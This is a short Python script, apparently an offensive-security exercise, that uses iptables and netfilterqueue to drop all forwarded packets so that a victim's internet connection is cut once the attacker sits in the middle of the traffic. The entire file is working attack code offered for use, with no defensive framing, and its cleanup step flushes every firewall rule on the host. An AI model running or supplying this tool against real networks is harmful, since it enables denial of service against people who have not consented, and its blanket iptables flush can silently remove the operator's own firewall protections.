#!/usr/bin/env python 
import subprocess 
import netfilterqueue
import sys
#Just need to be the MITM of the target in order to cut his connexion

def process_packet(packet) :
    print("\r[+] Target Connexion is being cut "),
    sys.stdout.flush()    
    packet.drop()

def queue_construct() :
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
try:
    queue_construct()
except KeyboardInterrupt :
    print("\n[+] Restoring The Iptable ..")
    subprocess.call(["iptables","--flush"])    